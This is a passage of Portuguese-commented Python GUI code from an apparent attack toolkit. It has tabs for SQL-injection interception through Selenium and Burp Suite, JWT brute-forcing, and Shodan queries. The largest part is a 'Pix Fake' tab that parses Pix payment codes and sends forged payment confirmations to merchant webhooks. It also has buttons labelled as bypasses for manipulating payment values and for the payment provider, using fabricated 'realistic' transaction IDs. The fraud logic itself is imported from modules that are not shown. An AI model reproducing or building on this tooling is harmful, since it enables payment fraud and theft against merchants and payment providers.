        h_nav.addWidget(self.selenium_screenshot_btn)
        v1.addLayout(h_nav)
        # Execução de JavaScript
        h_js = QHBoxLayout()
        self.selenium_js_input = QLineEdit()
        self.selenium_js_input.setPlaceholderText('JavaScript...')
        h_js.addWidget(self.selenium_js_input)
        self.selenium_js_exec_btn = QPushButton('Executar JS')
        self.selenium_js_exec_btn.clicked.connect(self.exec_js_selenium)
        h_js.addWidget(self.selenium_js_exec_btn)
        v1.addLayout(h_js)
        # Controle de cookies
        h_cookie = QHBoxLayout()
        self.selenium_cookie_show_btn = QPushButton('Mostrar Cookies')
        self.selenium_cookie_show_btn.clicked.connect(self.show_selenium_cookies)
        h_cookie.addWidget(self.selenium_cookie_show_btn)
        self.selenium_cookie_clear_btn = QPushButton('Limpar Cookies')
        self.selenium_cookie_clear_btn.clicked.connect(lambda: self.current_interceptor.clear_cookies(log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}')))
        h_cookie.addWidget(self.selenium_cookie_clear_btn)
        v1.addLayout(h_cookie)
        # Botão Iniciar Selenium externo
        h_ext_selenium = QHBoxLayout()
        h_ext_selenium.addStretch()
        self.start_selenium_btn = QPushButton('Iniciar Selenium')
        self.start_selenium_btn.setToolTip('Irá abrir o programa externamente para controle do Selenium')
        self.start_selenium_btn.clicked.connect(self.launch_selenium_external)
        h_ext_selenium.addWidget(self.start_selenium_btn)
        v1.addLayout(h_ext_selenium)
        # Wrap the Selenium intercept page in a scroll area for vertical scrolling
        scroll_page1 = QScrollArea()
        scroll_page1.setWidgetResizable(True)
        scroll_page1.setWidget(page1)
        self.sqli_stack.addWidget(scroll_page1)
        # Página 2: Burp Suite API - full integration
        page3 = QWidget()
        page3_layout = QVBoxLayout(page3)
        # Configuração da API Burp
        form3 = QFormLayout()
        self.burp_api_url = QLineEdit()
        form3.addRow('API URL:', self.burp_api_url)
        self.burp_api_token = QLineEdit()
        self.burp_api_token.setEchoMode(QLineEdit.Password)
        form3.addRow('API Token:', self.burp_api_token)
        self.burp_project = QLineEdit()
        browse_burp_btn = QPushButton('📂')
        browse_burp_btn.clicked.connect(lambda: self.burp_project.setText(QFileDialog.getOpenFileName(self, 'Select Project', '', 'Burp Project Files (*.burp)')[0]))
        form3.addRow('Project file:', self.burp_project)
        form3.addRow(browse_burp_btn)
        page3_layout.addLayout(form3)
        # Fluxos capturados pelo Burp Suite API
        group_b = QGroupBox('Fluxos Burp Suite API')
        layout_b = QVBoxLayout(group_b)
        self.burp_table = QTableWidget(0, 4)
        self.burp_table.setHorizontalHeaderLabels(['ID','Method','URL','Status'])
        layout_b.addWidget(self.burp_table)
        # Controle de fluxo Burp
        h_burp = QHBoxLayout()
        self.burp_intercept_next_btn = QPushButton('Interceptar Próxima')
        self.burp_intercept_next_btn.clicked.connect(self.burp_intercept_next)
        h_burp.addWidget(self.burp_intercept_next_btn)
        self.burp_forward_btn = QPushButton('Forward')
        self.burp_forward_btn.clicked.connect(self.burp_forward)
        h_burp.addWidget(self.burp_forward_btn)
        self.burp_drop_btn = QPushButton('Drop')
        self.burp_drop_btn.clicked.connect(self.burp_drop)
        h_burp.addWidget(self.burp_drop_btn)
        layout_b.addLayout(h_burp)
        page3_layout.addWidget(group_b)
        # Botão Iniciar BurpSuite API externo
        h_ext_burp = QHBoxLayout()
        h_ext_burp.addStretch()
        self.start_burp_api_btn = QPushButton('Iniciar BurpSuite API')
        self.start_burp_api_btn.setToolTip('Irá abrir o programa externamente para controle do Burp Suite API')
        self.start_burp_api_btn.clicked.connect(self.launch_burp_external)
        h_ext_burp.addWidget(self.start_burp_api_btn)
        page3_layout.addLayout(h_ext_burp)
        self.sqli_stack.addWidget(page3)
        # Map combo index to stacked page: +1 offset (0->Selenium page, 1->Burp)
        self.sqli_tool_combo.currentIndexChanged.connect(lambda idx: self.sqli_stack.setCurrentIndex(idx+1))
        layout.addWidget(self.sqli_stack)
        # Botões nativos de interceptação
        h_browser = QHBoxLayout()
        self.open_browser_btn = QPushButton('Abrir Ferramenta')
        self.open_browser_btn.setToolTip('Abre a ferramenta de interceptação selecionada')
        self.open_browser_btn.clicked.connect(self.open_sqli_browser)
        h_browser.addWidget(self.open_browser_btn)
        self.stop_browser_btn = QPushButton('Parar Ferramenta')
        self.stop_browser_btn.setEnabled(False)
        self.stop_browser_btn.setToolTip('Para a ferramenta de interceptação ativa')
        self.stop_browser_btn.clicked.connect(self.stop_sqli_browser)
        h_browser.addWidget(self.stop_browser_btn)
        layout.addLayout(h_browser)
        # Log console
        self.sqli_log = QTextEdit()
        self.sqli_log.setReadOnly(True)
        layout.addWidget(self.sqli_log)
        # Botão parar interceptação SQLi
        self.sqli_stop_btn = QPushButton('Parar Interceptação')
        self.sqli_stop_btn.setEnabled(False)
        self.sqli_stop_btn.clicked.connect(self.stop_sqli)
        layout.addWidget(self.sqli_stop_btn)
        self.tabs.addTab(sql_tab, 'SQLi')

        # Conecta troca de ferramenta à visibilidade do painel Burp
        self.sqli_tool_combo.currentTextChanged.connect(self.on_sqli_tool_changed)
        self.on_sqli_tool_changed(self.sqli_tool_combo.currentText())

        # Separate BurpSuite panel removed; flows are integrated in the stack page.

    def run_sqli_intercept(self):
        """Run SQLi interception and suggestion in a background thread."""
        url = self.sqli_url_entry.text().strip()
        if not url:
            QMessageBox.warning(self, 'SQLi', 'Informe a URL alvo.')
            return
        tool = self.sqli_tool_combo.currentText()
        self.sqli_log.clear()
        # prepara abort e UI
        self._sqli_abort.clear()
        self.sqli_btn.setText('Executando...')
        self.sqli_btn.setEnabled(False)
        self.sqli_stop_btn.setEnabled(True)
        # callback genérico de logs com timestamp
        def log_cb(msg):
            now = datetime.now().strftime('%H:%M:%S')
            QTimer.singleShot(0, lambda: self.sqli_log.append(f'[{now}] {msg}'))
        # instancia interceptor conforme ferramenta selecionada
        if tool == 'Selenium':
            browser = self.selenium_browser_combo.currentText()
            driver_path = self.selenium_driver_path.text().strip()
            headless = self.selenium_headless_cb.isChecked()
            interceptor = SeleniumInterceptor(browser, driver_path, headless)
        elif tool == 'Burp Suite API':
            api_url = self.burp_api_url.text().strip()
            api_token = self.burp_api_token.text().strip()
            # script path enviado no start
            script = self.burp_project.text().strip() or None
            interceptor = BurpAPI(api_url, api_token)
        else:
            log_cb(f'Ferramenta desconhecida: {tool}')
            return
        self.current_interceptor = interceptor
        # inicia interceptação em thread para manter UI responsiva
        if tool == 'Burp Suite API':
            threading.Thread(target=lambda: (interceptor.start(url, script, log_cb), QTimer.singleShot(0, self.finish_sqli)), daemon=True).start()
        else:
            threading.Thread(target=lambda: (interceptor.start(url, log_cb), QTimer.singleShot(0, self.finish_sqli)), daemon=True).start()

    def stop_sqli(self):
        """Stop SQLi interception"""
        # envia sinal de stop ao interceptor ativo
        if hasattr(self, 'current_interceptor'):
            try:
                self.current_interceptor.stop(log_callback=lambda m: self.sqli_log.append(m))
            except TypeError:
                try:
                    self.current_interceptor.stop()
                except Exception as e:
                    self.sqli_log.append(f'Erro ao parar interceptação: {e}')
        # atualiza UI
        self.sqli_log.append('Interceptação interrompida pelo usuário')
        self.sqli_stop_btn.setEnabled(False)
        self.sqli_btn.setEnabled(True)
        self.sqli_btn.setText('Iniciar Interceptação')
    def finish_sqli(self):
        """Restore UI after SQLi intercept completes"""
        self.sqli_btn.setEnabled(True)
        self.sqli_stop_btn.setEnabled(False)
        self.sqli_btn.setText('Iniciar Interceptação')

    def open_sqli_browser(self):
        """Abre o WebDriver via Selenium e inicia interceptação nativa"""
        url = self.sqli_url_entry.text().strip()
        if not url:
            QMessageBox.warning(self, 'SQLi', 'Informe a URL alvo antes de abrir o navegador.')
            return
        tool = self.sqli_tool_combo.currentText()
        # Função de log genérica
        def log_cb(msg):
            QTimer.singleShot(0, lambda: self.sqli_log.append(msg))
        # Decide qual interceptor usar
        if tool == 'Selenium':
            browser = self.selenium_browser_combo.currentText()
            driver_path = self.selenium_driver_path.text().strip()
            headless = self.selenium_headless_cb.isChecked()
            self.tool_interceptor = SeleniumInterceptor(browser, driver_path, headless)
            self.open_browser_btn.setEnabled(False)
            self.stop_browser_btn.setEnabled(True)
            threading.Thread(target=lambda: self.tool_interceptor.start(url, log_cb), daemon=True).start()
        elif tool == 'Burp Suite API':
            api_url = self.burp_api_url.text().strip()
            api_token = self.burp_api_token.text().strip()
            project = self.burp_project.text().strip() or None
            from core.interceptors.burp_api import BurpAPI
            self.tool_interceptor = BurpAPI(api_url, api_token, project)
            self.open_browser_btn.setEnabled(False)
            self.stop_browser_btn.setEnabled(True)
            threading.Thread(target=lambda: self.tool_interceptor.start(url, log_cb), daemon=True).start()
        else:
            log_cb(f'Ferramenta desconhecida: {tool}')

    def stop_sqli_browser(self):
        """Encerra o WebDriver do Selenium"""
        # Interrompe interceptor de acordo com a ferramenta ativa
        if hasattr(self, 'tool_interceptor'):
            try:
                # Alguns interceptors aceitam log_callback opcional
                stop_sig = getattr(self.tool_interceptor, 'stop')
                stop_sig(log_callback=lambda m: self.sqli_log.append(m) if isinstance(m, str) else None)
            except TypeError:
                # sem log_callback
                try:
                    self.tool_interceptor.stop()
                except Exception as e:
                    self.sqli_log.append(f'Erro ao parar interceptação: {e}')
        self.stop_browser_btn.setEnabled(False)
        self.open_browser_btn.setEnabled(True)
        self.sqli_log.append(f'Interceptação de {self.sqli_tool_combo.currentText()} parada pelo usuário')

    def toggle_chat_panel(self):
        # Toggle the visibility of the chat dock
        if self.chat_dock.isVisible():
            self.chat_dock.hide()
        else:
            self.chat_dock.setFloating(True)
            self.chat_dock.show()

    def clear_chat_history(self):
        """Clear all messages from the chat area"""
        for i in reversed(range(self.chat_content_layout.count())):
            widget = self.chat_content_layout.itemAt(i).widget()
            if widget:
                widget.setParent(None)

    def stop_scan(self):
        """Abortar a varredura em andamento"""
        self._scan_abort.set()
        self.stop_scan_btn.setEnabled(False)
        self.scan_btn.setEnabled(True)
        self.scan_log_signal.emit('Varredura cancelada pelo usuário')

    def finish_jwt_bruteforce(self):
        """Restore UI after JWT brute-force completes"""
        self.jwt_brute_btn.setEnabled(True)
        self.jwt_brute_stop_btn.setEnabled(False)
        self.jwt_brute_log.append('Brute-force JWT finalizado.')

    def finish_jwt_sqli(self):
        """Restore UI after SQL Injection completes"""
        self.jwt_sqli_btn.setEnabled(True)
        self.jwt_sqli_stop_btn.setEnabled(False)
        self.jwt_sqli_log.append('SQL Injection finalizado.')

    def on_sqli_tool_changed(self, tool):
        # no-op: sqli_stack handles BurpSuite API UI within page3
        pass

    # Burp Suite API control methods
    def burp_intercept_next(self):
        """Fetch next intercepted request from Burp API"""
        data = self.current_interceptor.intercept_next(log_callback=lambda m: self.sqli_log.append(f'[BurpAPI] {m}'))
        if data:
            row = self.burp_table.rowCount()
            self.burp_table.insertRow(row)
            self.burp_table.setItem(row, 0, QTableWidgetItem(str(data.get('id',''))))
            self.burp_table.setItem(row, 1, QTableWidgetItem(data.get('method','')))
            self.burp_table.setItem(row, 2, QTableWidgetItem(data.get('url','')))
            self.burp_table.setItem(row, 3, QTableWidgetItem(str(data.get('status',''))))

    def burp_forward(self):
        """Forward selected request"""
        row = self.burp_table.currentRow()
        if row < 0:
            return
        request_id = self.burp_table.item(row, 0).text()
        self.current_interceptor.forward(request_id, log_callback=lambda m: self.sqli_log.append(f'[BurpAPI] {m}'))

    def burp_drop(self):
        """Drop selected request"""
        row = self.burp_table.currentRow()
        if row < 0:
            return
        request_id = self.burp_table.item(row, 0).text()
        self.current_interceptor.drop(request_id, log_callback=lambda m: self.sqli_log.append(f'[BurpAPI] {m}'))

    # Selenium control handlers
    def update_selenium_flows(self):
        """Atualiza tabela com fluxos capturados pelo Selenium"""
        try:
            flows = self.current_interceptor.get_flows()
            self.selenium_flows_table.setRowCount(0)
            for flow in flows:
                row = self.selenium_flows_table.rowCount()
                self.selenium_flows_table.insertRow(row)
                self.selenium_flows_table.setItem(row, 0, QTableWidgetItem(str(flow['id'])))
                self.selenium_flows_table.setItem(row, 1, QTableWidgetItem(flow['method']))
                self.selenium_flows_table.setItem(row, 2, QTableWidgetItem(flow['url']))
                self.selenium_flows_table.setItem(row, 3, QTableWidgetItem(str(flow['status'])))
        except Exception as e:
            self.sqli_log.append(f'[Selenium] Erro ao atualizar fluxos: {e}')

    def reload_selenium_page(self):
        """Recarrega página atual no Selenium"""
        self.current_interceptor.reload_page(log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}'))

    def export_selenium_har(self):
        """Exporta HAR dos fluxos do Selenium"""
        fname, _ = QFileDialog.getSaveFileName(self, 'Salvar HAR', '', 'HAR Files (*.har);;All Files (*)')
        if fname:
            self.current_interceptor.export_har(fname, log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}'))

    def capture_selenium_screenshot(self):
        """Captura screenshot da página Selenium"""
        fname, _ = QFileDialog.getSaveFileName(self, 'Salvar Screenshot', '', 'PNG Files (*.png);;All Files (*)')
        if fname:
            self.current_interceptor.screenshot(fname, log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}'))

    def exec_js_selenium(self):
        """Executa JavaScript na página via SeleniumInterceptor"""
        script = self.selenium_js_input.text().strip()
        if not script:
            return
        try:
            result = self.current_interceptor.execute_script(script, log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}'))
            if result is not None:
                self.sqli_log.append(f'[Selenium] Resultado JS: {result}')
        except Exception as e:
            self.sqli_log.append(f'[Selenium] Erro ao executar JS: {e}')

    def show_selenium_cookies(self):
        """Exibe cookies capturados pelo SeleniumInterceptor"""
        try:
            cookies = self.current_interceptor.get_cookies(log_callback=lambda m: self.sqli_log.append(f'[Selenium] {m}'))
            for cookie in cookies:
                self.sqli_log.append(f'[Selenium] Cookie: {cookie}')
        except Exception as e:
            self.sqli_log.append(f'[Selenium] Erro ao obter cookies: {e}')

    def launch_selenium_external(self):
        """Launch external Selenium-controlled browser via Selenium WebDriver."""
        # select Selenium page
        self.sqli_tool_combo.setCurrentIndex(0)
        # use existing browser launch
        self.open_sqli_browser()

    def launch_burp_external(self):
        """Launch external Burp Suite application."""
        exe = shutil.which('burpsuite')
        if exe:
            try:
                subprocess.Popen([exe])
            except Exception as e:
                QMessageBox.critical(self, 'Burp Suite', f'Erro ao iniciar Burp Suite: {e}')
        else:
            QMessageBox.warning(self, 'Burp Suite', 'Burp Suite não encontrado no PATH')

    def setup_fake_pix_tab(self):
        """Setup Pix Fake tab with original fields restored."""
        self.fake_pix_tab_content = QWidget()
        main_layout = QHBoxLayout(self.fake_pix_tab_content)
        main_layout.setContentsMargins(16, 16, 16, 16)
        main_layout.setSpacing(8)

        # ----------- COLUNA ESQUERDA: INPUTS E CONFIG -----------
        left_widget = QWidget()
        left_widget.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        left_widget.setMinimumWidth(int(self.width()*0.46))
        left_layout = QVBoxLayout(left_widget)
        left_layout.setSpacing(18)
        self.pix_copy_paste_code = QTextEdit()
        self.pix_copy_paste_code.setPlaceholderText('Cole aqui o código Pix copia-e-cola')
        self.pix_copy_paste_code.setMaximumHeight(60)
        left_layout.addWidget(self.pix_copy_paste_code)
        self.btn_extract_pix_data = QPushButton('Extrair Dados do PIX')
        self.btn_extract_pix_data.setToolTip('Extrai dados do código copia-e-cola para os campos abaixo')
        self.btn_extract_pix_data.clicked.connect(self.extract_pix_data)
        left_layout.addWidget(self.btn_extract_pix_data)
        cfg_group = QGroupBox('Configurações Fake Pix')
        cfg_layout = QFormLayout(cfg_group)
        self.pix_jwt_token = QLineEdit()
        self.pix_jwt_token.setPlaceholderText('Ex: 12')
        cfg_layout.addRow('Token JWT:', self.pix_jwt_token)
        self.pix_user_id = QLineEdit()
        self.pix_user_id.setPlaceholderText('Ex: fromhell')
        cfg_layout.addRow('User ID:', self.pix_user_id)
        self.pix_value = QLineEdit()
        self.pix_value.setPlaceholderText('Ex: 50,00')
        cfg_layout.addRow('Valor Pix:', self.pix_value)
        self.pix_endpoint = QLineEdit()
        self.pix_endpoint.setPlaceholderText('/pix/confirm (opcional)')
        cfg_layout.addRow('Endpoint (opcional):', self.pix_endpoint)
        self.pix_txid = QLineEdit()
        self.pix_txid.setPlaceholderText('valor extraído do QR ou copypaste code')
        cfg_layout.addRow('TXID:', self.pix_txid)
        self.pix_receiver = QLineEdit()
        self.pix_receiver.setPlaceholderText('Ex: PRIME LTDA')
        cfg_layout.addRow('Nome do Recebedor:', self.pix_receiver)
        self.pix_webhook_url = QLineEdit()
        self.pix_webhook_url.setPlaceholderText('Ex: https://seu-webhook.com/pix')
        cfg_layout.addRow('Webhook URL:', self.pix_webhook_url)
        left_layout.addWidget(cfg_group)

        manip_group = QGroupBox('Manipulação de Valor Pix (Bypass Valor)')
        manip_layout = QFormLayout(manip_group)
        self.pix_emv_code_manip = QTextEdit()
        self.pix_emv_code_manip.setPlaceholderText('Cole aqui o código Pix copia-e-cola (EMV)')
        self.pix_emv_code_manip.setMaximumHeight(50)
        manip_layout.addRow('Código Pix (copia-e-cola):', self.pix_emv_code_manip)
        self.btn_preencher_pix_manip = QPushButton('Preencher dados do Pix')
        self.btn_preencher_pix_manip.setToolTip('Extrai e preenche automaticamente os campos abaixo a partir do código Pix')
        self.btn_preencher_pix_manip.clicked.connect(self.preencher_campos_pix_manip)
        manip_layout.addRow(self.btn_preencher_pix_manip)
        self.pix_valor_entrada = QDoubleSpinBox()
        self.pix_valor_entrada.setMaximum(1e9)
        self.pix_valor_entrada.setDecimals(2)
        self.pix_valor_entrada.setPrefix('R$ ')
        self.pix_valor_entrada.setToolTip('Valor de entrada (enviado pelo pagador)')
        manip_layout.addRow('Valor de Entrada:', self.pix_valor_entrada)
        self.pix_valor_saida = QDoubleSpinBox()
        self.pix_valor_saida.setMaximum(1e9)
        self.pix_valor_saida.setDecimals(2)
        self.pix_valor_saida.setPrefix('R$ ')
        self.pix_valor_saida.setToolTip('Valor de saída (recebido pelo recebedor)')
        manip_layout.addRow('Valor de Saída:', self.pix_valor_saida)
        self.pix_chave_manip = QLineEdit()
        self.pix_chave_manip.setPlaceholderText('Chave Pix')
        manip_layout.addRow('Chave Pix:', self.pix_chave_manip)
        self.pix_nome_manip = QLineEdit()
        self.pix_nome_manip.setPlaceholderText('Nome do Recebedor')
        manip_layout.addRow('Nome do Recebedor:', self.pix_nome_manip)
        self.pix_endpoint_criacao = QLineEdit()
        self.pix_endpoint_criacao.setPlaceholderText('Endpoint de Criação')
        manip_layout.addRow('Endpoint Criação:', self.pix_endpoint_criacao)
        self.pix_endpoint_webhook = QLineEdit()
        self.pix_endpoint_webhook.setPlaceholderText('Endpoint Webhook')
        manip_layout.addRow('Endpoint Webhook:', self.pix_endpoint_webhook)
        self.pix_txid_manip = QLineEdit()
        self.pix_txid_manip.setPlaceholderText('Opcional')
        manip_layout.addRow('TXID (opcional):', self.pix_txid_manip)
        self.btn_pix_manipular = QPushButton('Manipular Valor Pix (Bypass)')
        self.btn_pix_manipular.setToolTip('Executa manipulação do valor Pix com endpoints e valores customizados')
        self.btn_pix_manipular.clicked.connect(self.executar_pix_manipulacao_gui)
        manip_layout.addRow(self.btn_pix_manipular)
        manip_group.setLayout(manip_layout)
        left_layout.addWidget(manip_group)

        main_layout.addWidget(left_widget, 2)

        # Coluna Direita
        right_widget = QWidget()
        right_widget.setSizePolicy(QSizePolicy.Minimum, QSizePolicy.Preferred)
        right_layout = QVBoxLayout(right_widget)
        right_layout.setSpacing(10)

        # Linha de botões principais
        btn_row = QHBoxLayout()
        btn_gen = QPushButton('✅ GERAR PAYLOAD')
        btn_gen.clicked.connect(self.generate_pix_payload)
        btn_row.addWidget(btn_gen)
        btn_send = QPushButton('📤 ENVIAR PARA WEBHOOK')
        btn_send.clicked.connect(self.send_pix_webhook)
        btn_row.addWidget(btn_send)
        btn_export = QPushButton('💾 EXPORTAR PAYLOAD')
        btn_export.clicked.connect(self.export_pix_payload)
        btn_row.addWidget(btn_export)
        btn_clear = QPushButton('🔄 LIMPAR CAMPOS')
        btn_clear.clicked.connect(self.clear_pix_fields)
        btn_row.addWidget(btn_clear)
        right_layout.addLayout(btn_row)

        # Linha de botões extras
        btn_extra_row = QHBoxLayout()
        self.btn_ocr_pix = QPushButton('📷 Importar QR (OCR)')
        btn_extra_row.addWidget(self.btn_ocr_pix)
        self.btn_auto_pix = QPushButton('💣 Injetar Automático')
        btn_extra_row.addWidget(self.btn_auto_pix)
        self.btn_injetar_com_bypass = QPushButton('💥 Injetar com Bypass PSP')
        btn_extra_row.addWidget(self.btn_injetar_com_bypass)
        right_layout.addLayout(btn_extra_row)

        # Output e preview
        self.pix_auto_output = QTextEdit()
        self.pix_auto_output.setReadOnly(True)
        self.pix_auto_output.setStyleSheet('background-color: #2b2b2b; color: #eee;')
        right_layout.addWidget(self.pix_auto_output)
        main_layout.addWidget(right_widget, 1)
        # Scroll area para a aba Pix Fake
        scroll_pix = QScrollArea()
        scroll_pix.setWidget(self.fake_pix_tab_content)
        self.tabs.addTab(scroll_pix, 'Pix Fake')

    # ... rest of the code remains the same ...
    def preencher_campos_pix_manip(self):
        """
        Extrai os dados do código copia-e-cola Pix (EMV) e preenche os campos de manipulação automaticamente.
        """
        from core.fake_pix_confirmer import FakePixConfirmer
        emv_code = self.pix_emv_code_manip.toPlainText().strip()
        if not emv_code:
            QMessageBox.warning(self, 'Aviso', 'Cole um código Pix copia-e-cola para extrair os dados.')
            return
        dados = FakePixConfirmer.parse_emv_payload(emv_code)
        if not dados:
            QMessageBox.critical(self, 'Erro', 'Não foi possível extrair os dados do código Pix.')
            return
        if 'chave' in dados:
            self.pix_chave_manip.setText(dados['chave'])
        if 'valor' in dados:
            try:
                self.pix_valor_entrada.setValue(float(dados['valor'].replace(',', '.')))
            except Exception:
                pass
        if 'merchant_name' in dados:
            self.pix_nome_manip.setText(dados['merchant_name'])
        if 'txid' in dados:
            self.pix_txid_manip.setText(dados['txid'])

    def executar_pix_manipulacao_gui(self):
        """
        Manipula o valor do Pix via interface gráfica e exibe o resultado e logs na área de saída.
        """
        from modules.fake_pix_module import manipular_valor_entrada_saida_pix
        valor_entrada = float(self.pix_valor_entrada.value())
        valor_saida = float(self.pix_valor_saida.value())
        chave_pix = self.pix_chave_manip.text().strip()
        endpoint_criacao = self.pix_endpoint_criacao.text().strip()
        endpoint_webhook = self.pix_endpoint_webhook.text().strip()
        txid = self.pix_txid_manip.text().strip() or None
        nome_recebedor = self.pix_nome_manip.text().strip() or None
        try:
            resultado = manipular_valor_entrada_saida_pix(
                valor_entrada, valor_saida, chave_pix, endpoint_criacao, endpoint_webhook, txid=txid, info_adicional={"pagador_nome": nome_recebedor} if nome_recebedor else None
            )
            if resultado:
                mensagem = (f"[✓] Manipulação de valor Pix concluída com sucesso!\n"
                            f"TXID: {resultado.get('txid', '')}\n"
                            f"Valor Entrada: R$ {resultado.get('valor_entrada', ''):.2f}\n"
                            f"Valor Saída: R$ {resultado.get('valor_saida', ''):.2f}\n")
            else:
                mensagem = "[!] Nenhum resultado retornado."
        except Exception as e:
            mensagem = f"[✗] Erro ao manipular valor Pix: {e}"
        self.pix_auto_output.setPlainText(mensagem)

    def generate_pix_payload(self):
        """Gera o payload JSON dos campos do formulário Pix Fake."""
        url_base = self.pix_url_base.text().strip()
        token = self.pix_jwt_token.text().strip()
        user_id = self.pix_user_id.text().strip()
        amount = self.pix_value.text().strip()
        endpoint = self.pix_endpoint.text().strip() or None
        txid = self.pix_txid.text().strip()
        receiver = self.pix_receiver.text().strip()
        if not url_base or not token or not user_id or not amount:
            QMessageBox.warning(self, 'Aviso', 'Preencha os campos URL Base, Token JWT, User ID e Valor Pix.')
            return
        # Monta o payload para visualização
        payload = {
            'jwt': token,
            'user_id': user_id,
            'amount': amount,
            'txid': txid,
            'receiver': receiver,
            'endpoint': endpoint
        }
        self.current_pix_payload = payload
        self.pix_payload_preview.setPlainText(json.dumps(payload, ensure_ascii=False, indent=2))
        self.pix_status_label.setText('Payload gerado com sucesso.')

    def send_pix_webhook(self):
        """Send the generated payload to the specified webhook URL."""
        if not hasattr(self, 'current_pix_payload'):
            self.pix_status_label.setText('Gere o payload primeiro.')
            return
        url = self.pix_webhook_url.text().strip()
        success, msg = send_webhook(self.current_pix_payload, url)
        if success:
            self.pix_status_label.setText('Webhook enviado com sucesso.')
        else:
            self.pix_status_label.setText(f'Erro ao enviar webhook: {msg}')

    def export_pix_payload(self):
        """Save the generated payload to a JSON file."""
        if not hasattr(self, 'current_pix_payload'):
            self.pix_status_label.setText('Gere o payload primeiro.')
            return
        ok = save_payload(self.current_pix_payload)
        if ok:
            self.pix_status_label.setText('Payload salvo em output/fake_pix_payload.json')
        else:
            self.pix_status_label.setText('Erro ao salvar payload.')

    def clear_pix_fields(self):
        """Clear all Pix Fake input fields and the payload preview."""
        self.pix_url_base.clear()
        self.pix_jwt_token.clear()
        self.pix_user_id.clear()
        self.pix_value.clear()
        self.pix_copy_paste_code.clear()
        self.pix_endpoint.clear()
        self.pix_txid.clear()
        self.pix_receiver.clear()
        self.pix_payload_preview.clear()
        self.pix_status_label.clear()
        if hasattr(self, 'current_pix_payload'):
            del self.current_pix_payload

    def extract_pix_data(self):
        """Extract EMV data from copy-paste code and populate fields."""
        payload = self.pix_copy_paste_code.toPlainText().strip()
        if not payload:
            QMessageBox.warning(self, 'Aviso', 'Insira o código Pix copia-e-cola.')
            return
        try:
            data = FakePixConfirmer.parse_emv_payload(payload)
            if data.get('chave'):
                self.pix_jwt_token.setText(data['chave'])
            if data.get('txid'):
                self.pix_txid.setText(data['txid'])
            if data.get('valor'):
                self.pix_value.setText(data['valor'])
            if data.get('merchant_name'):
                self.pix_receiver.setText(data['merchant_name'])
            QMessageBox.information(self, 'Sucesso', 'Dados do PIX extraídos com sucesso.')
        except Exception as e:
            QMessageBox.critical(self, 'Erro', f'Falha ao extrair dados: {e}')
        # Iniciar enriquecimento e OCR/injeção automática
        try:
            self._start_pix_auto_tasks(data)
        except Exception:
            pass

    def _start_pix_auto_tasks(self, data):
        # Em background: OCR e injeção automatizada
        threading.Thread(target=lambda: self._enrich_and_inject_pix(data), daemon=True).start()

    def _enrich_and_inject_pix(self, data):
        # Exibe dados extraídos via OCR (já aplicável em extract)
        # Injetar webhook automático
        pix_code = data.get('raw', '')
        jwt_token = data.get('chave', '')
        user_id = data.get('merchant_name', '')
        valor = float(data.get('valor', 0))
        endpoint = self.pix_endpoint.text().strip()
        nome = data.get('merchant_name', '')
        try:
            from modules.fake_pix_module import executar_fake_pix_automatizado
            txid = executar_fake_pix_automatizado(pix_code, jwt_token, user_id, valor, endpoint, nome)
            result_text = f"[✓] TXID Gerado: {txid}\nFake Pix enviado com sucesso."
        except Exception as e:
            result_text = f"[✗] Erro na injeção automática: {e}"
        # Atualizar GUI
        QTimer.singleShot(0, lambda: self.pix_auto_output.setPlainText(result_text))

    def carregar_qr_pix_ocr(self):
        img_path, _ = QFileDialog.getOpenFileName(self, 'Importar QR Code', '', 'Imagens (*.png *.jpg)')
        if img_path:
            from utils.ocr_parser import extract_from_pix_qr
            extraido = extract_from_pix_qr(img_path)
            self.pix_copy_paste_code.setPlainText(extraido)

    def executar_fake_pix_auto(self):
        # Captura campos atuais
        pix_code = self.pix_copy_paste_code.toPlainText().strip()
        jwt_token = self.pix_jwt_token.text().strip()
        user_id = self.pix_user_id.text().strip()
        try:
            valor = float(self.pix_value.text().strip())
        except:
            valor = 0.0
        endpoint = self.pix_endpoint.text().strip()
        nome = self.pix_receiver.text().strip()
        try:
            from modules.fake_pix_module import executar_fake_pix_automatizado
            txid = executar_fake_pix_automatizado(pix_code, jwt_token, user_id, valor, endpoint, nome)
            self.pix_auto_output.setPlainText(f"[✓] TXID Gerado: {txid}\nFake Pix enviado com sucesso.")
        except Exception as e:
            self.pix_auto_output.setPlainText(f"[✗] Erro na injeção automática: {e}")

    def executar_injecao_bypass_psp(self):
        """Executa bypass PSP para Fake Pix"""
        from utils.txid_generator import generate_realistic_txid
        from modules.fake_pix_module import injetar_fakepix_com_bypass

        pix_code = self.pix_copy_paste_code.toPlainText().strip()
        jwt_token = self.pix_jwt_token.text().strip()
        user_id = self.pix_user_id.text().strip()
        try:
            valor = float(self.pix_value.text().strip())
        except:
            valor = 0.0
        endpoint = self.pix_endpoint.text().strip()
        nome = self.pix_receiver.text().strip()
        txid = generate_realistic_txid()

        status, resposta = injetar_fakepix_com_bypass(jwt_token, user_id, valor, endpoint, nome, txid, pix_code)
        self.pix_auto_output.setPlainText(f"[✓] Bypass PSP Executado\nStatus: {status}\nResposta: {resposta}")

    def setup_shodan_tab(self):
        """Setup Shodan tab for executing Shodan queries via the GUI."""
        shodan_tab = QWidget()
        layout = QVBoxLayout(shodan_tab)
        # Connect to Shodan
        header_h = QHBoxLayout()
        header_h.addStretch()
        self.shodan_connect_btn = QPushButton('🔌 Conectar Shodan')
        self.shodan_connect_btn.setToolTip('Informe sua API Key do Shodan')
        header_h.addWidget(self.shodan_connect_btn)
        # Status da conexão Shodan
        self.shodan_status_label = QLabel('')
        header_h.addWidget(self.shodan_status_label)
        layout.addLayout(header_h)
        self.shodan_connect_btn.clicked.connect(self.connect_shodan)
        # Query input
        h1 = QHBoxLayout()
        h1.addWidget(QLabel('Consulta Shodan:'))
        self.shodan_query_entry = QLineEdit()
        self.shodan_query_entry.setToolTip('Termo de busca para o Shodan')
        h1.addWidget(self.shodan_query_entry)
        layout.addLayout(h1)
        # Limit input
        h2 = QHBoxLayout()
        h2.addWidget(QLabel('Limite de resultados:'))
        self.shodan_limit_spin = QSpinBox()
        self.shodan_limit_spin.setRange(1, 1000)
        self.shodan_limit_spin.setValue(50)
        h2.addWidget(self.shodan_limit_spin)
        layout.addLayout(h2)
        # Action buttons
        action_h = QHBoxLayout()
